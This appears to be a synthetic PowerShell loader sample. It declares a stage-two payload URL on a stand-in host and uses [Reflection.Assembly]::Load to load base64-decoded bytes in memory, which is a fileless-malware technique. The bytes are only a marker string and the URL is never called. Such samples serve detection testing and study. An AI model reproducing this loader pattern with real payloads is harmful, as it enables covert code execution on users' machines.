
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://adatum.com:8080/payload.bin',
    [int]$TimeoutSec = 149
)
$ErrorActionPreference = "Stop"

try {
    $ManagedBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo2aGhsanFkdDh1')
    Write-Verbose ("Assembly byte count: " + $ManagedBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($ManagedBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
